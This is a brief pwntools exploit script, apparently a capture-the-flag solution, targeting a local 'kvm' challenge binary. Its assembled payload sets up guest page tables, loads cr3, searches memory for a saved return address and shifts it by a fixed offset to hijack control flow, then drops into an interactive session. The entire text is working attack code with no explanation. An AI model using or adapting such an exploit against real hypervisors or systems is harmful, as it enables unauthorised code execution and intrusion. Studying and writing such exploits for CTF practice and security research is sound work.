from pwn import *
context.arch = 'amd64'
p = process("./kvm")
elf = ELF("./kvm")
payload = asm(
    """
    mov qword ptr [0x1000], 0x2003
    mov qword ptr [0x2000], 0x3003
    mov qword ptr [0x3000], 0x0003
    mov qword ptr [0x0], 0x3
    mov qword ptr [0x8], 0x7003

    mov rax, 0x1000
    mov cr3, rax

    mov rcx, 0x1020
look_for_ra:
    add rcx, 8
    cmp qword ptr [rcx], 0
    je look_for_ra

    add rcx, 24
overwrite_ra:
    mov rax, qword ptr [rcx]
    add rax, 0x249e6
    mov qword ptr [rcx], rax
    hlt
    """
)
log.success('len = '+str(len(payload)))
p.send("\x68\x00\x00\x00")
p.sendline(payload)
#gdb.attach(p)
p.recv(16)
#gdb.attach(p)
p.interactive()